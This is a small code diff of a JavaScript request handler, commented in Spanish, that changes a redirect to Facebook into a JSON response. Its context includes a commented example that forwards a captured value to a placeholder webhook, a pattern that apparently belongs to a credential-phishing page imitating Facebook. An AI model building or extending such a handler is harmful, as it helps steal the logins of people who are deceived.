@@ -65,6 +65,6 @@ export default async function handler(req, res) {
   // Opcional: Enviar a un webhook o base de datos
   // Por ejemplo, a un webhook: https.post('https://your-webhook-url.com', { body: line });
 
-  // Redirigir al sitio público de Facebook
-  res.redirect(302, 'https://www.facebook.com/');
+  // Responder con JSON para que el cliente maneje la redirección
+  res.status(200).json({ success: true, redirect: 'https://www.facebook.com/' });
 }
